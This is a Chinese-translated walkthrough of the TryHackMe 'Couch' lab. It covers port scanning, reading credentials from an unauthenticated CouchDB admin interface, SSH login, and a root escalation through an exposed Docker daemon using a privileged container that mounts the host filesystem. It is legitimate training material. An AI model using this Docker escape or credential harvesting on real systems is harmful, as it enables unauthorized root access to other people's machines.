<html>
<head>
<title>TryHackMe Writeup — Couch</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe报道—沙发</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-writeup-couch-a82d46bff231?source=collection_archive---------2-----------------------#2021-09-29">https://infosecwriteups.com/tryhackme-writeup-couch-a82d46bff231?source=collection_archive---------2-----------------------#2021-09-29</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><p id="1422" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">嗨，伙计们，又和特里哈克姆with玩得开心了。所以，这里是通过这个<strong class="js iu">沙发</strong>挑战的记录和指南。这个CTF房间是由CTF情人为CTF情人设计的。</p><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi ca"><img src="../Images/5f25e7d0addb0ac72c6262bfa7d7fcb1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*xVW-SHmNtWsoXAFn"/></div></div></figure><p id="123b" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated"><strong class="js iu">房间</strong>:<a class="ae kz" href="https://tryhackme.com/room/couch" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/couch</a><br/><strong class="js iu">级别</strong>:简单(初学者容易)</p><p id="53ea" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated"><strong class="js iu">任务</strong>:在这个半引导的挑战中，黑进一个易受攻击的数据库服务器，该服务器以基于JSON的文档格式收集和存储数据。</p><h1 id="49a3" class="la lb it bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated">我们开始吧</h1><p id="eac9" class="pw-post-body-paragraph jq jr it js b jt ly jv jw jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn im bi translated">像往常一样，启动机器并在浏览器中打开IP，但看起来端口80不可用</p><p id="b1da" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">让我们运行端口扫描</p><pre class="ko kp kq kr gt md me mf mg aw mh bi"><span id="6b01" class="mi lb it me b gy mj mk l ml mm"># nmap -A -T4 -sS -sV -p- 10.10.X.X<br/>...<br/>...<br/>PORT     STATE SERVICE VERSION<br/><strong class="me iu">22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)</strong><br/>| ssh-hostkey:<br/>|   2048 34:9d:39:09:34:30:4b:3d:a7:1e:df:eb:a3:b0:e5:aa (RSA)<br/>|   256 a4:2e:ef:3a:84:5d:21:1b:b9:d4:26:13:a5:2d:df:19 (ECDSA)<br/>|_  256 e1:6d:4d:fd:c8:00:8e:86:c2:13:2d:c7:ad:85:13:9c (ED25519)<br/><strong class="me iu">5984/tcp open  http    CouchDB httpd 1.6.1 (Erlang OTP/18)</strong><br/>|_http-title: Site doesn't have a title (text/plain; charset=utf-8).<br/>|_http-server-header: CouchDB/1.6.1 (Erlang OTP/18)<br/>No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span></pre><p id="511d" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">2个端口打开(22和5984)。5984指的是<a class="ae kz" href="http://couchdb.apache.org/" rel="noopener ugc nofollow" target="_blank"> Apache CouchDB </a>。打开10.10.x.x:5984显示</p><pre class="ko kp kq kr gt md me mf mg aw mh bi"><span id="a62e" class="mi lb it me b gy mj mk l ml mm">{"couchdb":"Welcome","uuid":"ef680bb740692240059420b2c17db8f3","version":"1.6.1","vendor":{"version":"16.04","name":"Ubuntu"}}</span></pre><p id="3e07" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">让我们先跑步，然后我们来回答问题</p><pre class="ko kp kq kr gt md me mf mg aw mh bi"><span id="dab3" class="mi lb it me b gy mj mk l ml mm">&gt; feroxbuster --url http://10.10.X.X:5984/ -w ~/wordlists/dirb/big.txt -t 60 -C 404,403</span><span id="4a58" class="mi lb it me b gy mq mk l ml mm">200        1l       80w     4808c <a class="ae kz" href="http://10.10.136.186:5984/_config" rel="noopener ugc nofollow" target="_blank">http://10.10.136.186:5984/_config</a><br/>200       12l      166w        0c <a class="ae kz" href="http://10.10.136.186:5984/_log" rel="noopener ugc nofollow" target="_blank">http://10.10.136.186:5984/_log</a><br/>405        1l        3w       60c <a class="ae kz" href="http://10.10.136.186:5984/_plugins" rel="noopener ugc nofollow" target="_blank">http://10.10.136.186:5984/_plugins</a><br/>200        1l      156w     4627c <a class="ae kz" href="http://10.10.136.186:5984/_stats" rel="noopener ugc nofollow" target="_blank">http://10.10.136.186:5984/_stats</a><br/>301        0l        0w        0c <a class="ae kz" href="http://10.10.136.186:5984/_utils" rel="noopener ugc nofollow" target="_blank">http://10.10.136.186:5984/_utils</a><br/>200        1l        1w      230c <a class="ae kz" href="http://10.10.136.186:5984/_users" rel="noopener ugc nofollow" target="_blank">http://10.10.136.186:5984/_users</a><br/>.....<br/>.....</span></pre><p id="fb67" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">有一些可用的路径可以被访问，除了<code class="fe mn mo mp me b">_utils</code>路径外，大部分都是JSON输出。没关系，让我们先把问题过一遍</p><h2 id="763b" class="mi lb it bd lc mr ms dn lg mt mu dp lk kb mv mw lo kf mx my ls kj mz na lw nb bi translated">扫描机器。开放了多少个端口？</h2><p id="1c9c" class="pw-post-body-paragraph jq jr it js b jt ly jv jw jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn im bi translated">发现有2个端口打开(22和5984)</p><h2 id="793d" class="mi lb it bd lc mr ms dn lg mt mu dp lk kb mv mw lo kf mx my ls kj mz na lw nb bi translated">服务器上安装的是什么数据库管理系统？</h2><p id="178f" class="pw-post-body-paragraph jq jr it js b jt ly jv jw jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn im bi translated">安装的数据库管理系统是<a class="ae kz" href="http://couchdb.apache.org/" rel="noopener ugc nofollow" target="_blank"> Apache CouchDB </a></p><h2 id="6f41" class="mi lb it bd lc mr ms dn lg mt mu dp lk kb mv mw lo kf mx my ls kj mz na lw nb bi translated">数据库管理系统运行在哪个端口上？</h2><p id="b624" class="pw-post-body-paragraph jq jr it js b jt ly jv jw jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn im bi translated">couchDB = 5984的端口</p><h2 id="66b8" class="mi lb it bd lc mr ms dn lg mt mu dp lk kb mv mw lo kf mx my ls kj mz na lw nb bi translated">服务器上安装的管理系统是什么版本？</h2><p id="d265" class="pw-post-body-paragraph jq jr it js b jt ly jv jw jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn im bi translated">正如JSON字符串中提到的，版本是1.6.1</p><h2 id="9bc5" class="mi lb it bd lc mr ms dn lg mt mu dp lk kb mv mw lo kf mx my ls kj mz na lw nb bi translated">这个数据库管理系统的web管理工具的路径是什么？</h2><p id="1de8" class="pw-post-body-paragraph jq jr it js b jt ly jv jw jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn im bi translated">基于feroxbuster结果，<code class="fe mn mo mp me b"><strong class="js iu"><em class="nc">_utils</em></strong></code>是正确路径</p><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi nd"><img src="../Images/4d956c0094869cea31dbb9fb265c1c80.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dWjcq8Fi0VyYReII9qiSYw.png"/></div></div></figure><h2 id="b4b1" class="mi lb it bd lc mr ms dn lg mt mu dp lk kb mv mw lo kf mx my ls kj mz na lw nb bi translated">在数据库管理系统的web浏览器中列出所有数据库的路径是什么？</h2><p id="5c27" class="pw-post-body-paragraph jq jr it js b jt ly jv jw jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn im bi translated">参考couchDB文档，其明确表示<strong class="js iu"> <em class="nc"> _all_dbs </em> </strong>路径</p><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi ne"><img src="../Images/39829e85893290a1932b45a04d8219dd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tyG0kyGcKx8wqI0ORDk88A.png"/></div></div></figure><h2 id="75aa" class="mi lb it bd lc mr ms dn lg mt mu dp lk kb mv mw lo kf mx my ls kj mz na lw nb bi translated">web管理工具中有哪些凭据？</h2><p id="5155" class="pw-post-body-paragraph jq jr it js b jt ly jv jw jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn im bi translated">浏览所有可用的可点击项目，并在“秘密”数据库中找到用户凭证</p><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi nf"><img src="../Images/6a10d35822a74ee39664b272b8df2493.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Gpa4c54z1jrIQLnalmL67A.png"/></div></div></figure><h2 id="b33c" class="mi lb it bd lc mr ms dn lg mt mu dp lk kb mv mw lo kf mx my ls kj mz na lw nb bi translated">危及机器安全并找到user.txt</h2><p id="b720" class="pw-post-body-paragraph jq jr it js b jt ly jv jw jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn im bi translated">因为没有表单登录或任何页面来放置凭证，所以可能是SSH登录，因为端口22是打开的</p><pre class="ko kp kq kr gt md me mf mg aw mh bi"><span id="c27c" class="mi lb it me b gy mj mk l ml mm"><strong class="me iu">&gt; ssh atena@10.10.X.X<br/></strong>The authenticity of host '10.10.X.X (10.10.X.X)' can't be established.<br/>ECDSA key fingerprint is SHA256:TtfUUNS6Ivob4iQ7X414863lCCc1q2YyzzycIkRTZ3k.<br/>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br/>Warning: Permanently added '10.10.X.X' (ECDSA) to the list of known hosts.<br/><strong class="me iu">atena@10.10.X.'s password:</strong></span><span id="e6ab" class="mi lb it me b gy mq mk l ml mm">Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-193-generic x86_64)</span><span id="fd22" class="mi lb it me b gy mq mk l ml mm">* Documentation:  <a class="ae kz" href="https://help.ubuntu.com" rel="noopener ugc nofollow" target="_blank">https://help.ubuntu.com</a><br/>* Management:     <a class="ae kz" href="https://landscape.canonical.com" rel="noopener ugc nofollow" target="_blank">https://landscape.canonical.com</a><br/>* Support:        <a class="ae kz" href="https://ubuntu.com/advantage" rel="noopener ugc nofollow" target="_blank">https://ubuntu.com/advantage</a><br/>Last login: Fri Dec 18 15:25:27 2020 from 192.168.85.1</span><span id="3a91" class="mi lb it me b gy mq mk l ml mm"><strong class="me iu">atena@ubuntu</strong>:<strong class="me iu">~</strong>$</span></pre><p id="6f5c" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">现在使用atena用户成功进入Ubuntu服务器。我们来找user.txt。</p><pre class="ko kp kq kr gt md me mf mg aw mh bi"><span id="eb25" class="mi lb it me b gy mj mk l ml mm">&gt; cat users.txt<br/>THM{1ns3cure_XXXXXX}</span></pre><p id="9196" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">真快。LOL。最后，我们来根！</p><h2 id="b203" class="mi lb it bd lc mr ms dn lg mt mu dp lk kb mv mw lo kf mx my ls kj mz na lw nb bi translated">提升权限并获取root.txt</h2><pre class="ko kp kq kr gt md me mf mg aw mh bi"><span id="2ad0" class="mi lb it me b gy mj mk l ml mm"><strong class="me iu">atena@ubuntu</strong>:<strong class="me iu">~</strong>$ sudo -l<br/>[sudo] password for atena:<br/>Sorry, user atena may not run sudo on ubuntu.</span></pre><p id="2a1a" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">好吧~~最容易的部分被屏蔽了。检查所有正在运行的crontab，但不检查任何一个。让我们看看历史吧，</p><pre class="ko kp kq kr gt md me mf mg aw mh bi"><span id="b13b" class="mi lb it me b gy mj mk l ml mm">cat ~/.bash_history</span></pre><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi ng"><img src="../Images/9ba93e62a135a4a946e5f2c1f85b0077.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CdxbwaH2c2yZRY5GDOAZFQ.png"/></div></div></figure><p id="05ad" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">该主机中正在运行docker。让我们运行码头</p><pre class="ko kp kq kr gt md me mf mg aw mh bi"><span id="a167" class="mi lb it me b gy mj mk l ml mm"><strong class="me iu">&gt; docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine</strong><br/>/ # id<br/><strong class="me iu">uid=0(root) </strong>gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</span></pre><p id="be9a" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">好..这是根..所以我们可以在这里枚举文件，</p><pre class="ko kp kq kr gt md me mf mg aw mh bi"><span id="8072" class="mi lb it me b gy mj mk l ml mm">&gt; find . -name root.txt<br/>./mnt/root/root.txt</span><span id="24db" class="mi lb it me b gy mq mk l ml mm">&gt; cat mnt/root/root.txt<br/><strong class="me iu">THM{RCE_us1ng_XXXXXXXXXXX}</strong></span></pre><p id="6e8b" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">这是CTF有史以来最快的一次。顺便说一句，我真的很喜欢CTF..</p><p id="55c5" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">感谢您的阅读，让我们来看看另一篇文章。🤘</p></div></div>    
</body>
</html>